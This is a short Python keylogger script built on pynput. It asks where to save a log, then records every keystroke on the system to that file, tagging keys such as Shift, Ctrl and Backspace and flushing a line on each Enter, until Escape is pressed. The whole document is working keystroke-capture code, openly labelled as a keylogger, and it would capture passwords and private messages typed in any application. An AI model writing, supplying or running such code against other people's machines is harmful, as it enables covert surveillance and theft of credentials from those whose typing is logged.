from pynput.keyboard import Key, Listener
import logging
import os

# Get directory or file input
while True:
    dir = input(str("Save to directory: "))
    if(dir[-1] == "/"):
        dir = dir[:-1] # If directory ends in '/' remove it
    file = input(str("Save to file: "))
    if(not(os.path.isdir(dir))):
        print("\nDirectory doesn't exist, please try again\n")
        continue
    else:
        break

# Log into file
logging.basicConfig(filename=(dir + "/" + file), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Array to store keystrokes
msg = ""

def on_press(key):
    global msg, special
    try:
        if (key == Key.esc):
            print("ESC detected: Terminating keylogger")
            logging.info(msg)
            return False
        elif(key == Key.space):
            msg += " "
        elif(key == Key.shift or key == Key.shift_r):
            msg += "<SHIFT>"
        elif(key == Key.ctrl or key == Key.ctrl_r):
            msg += "<CTRL>"
        elif(key == Key.backspace):
            msg += "<BACKSPACE>"
        elif(key == Key.tab):
            msg += "<TAB>"
        elif(key == Key.caps_lock):
            msg += "<CAPSLOCK>"
        elif(key == Key.enter):
            logging.info(msg + "<ENTER>")
            msg = ""
        else:
            msg += key.char
    except IOError:
        print("ERROR: Could not log to file")
    except AttributeError as e:
        print("Special key pressed: {0}", e)

with Listener(on_press=on_press) as listener:
    listener.join()
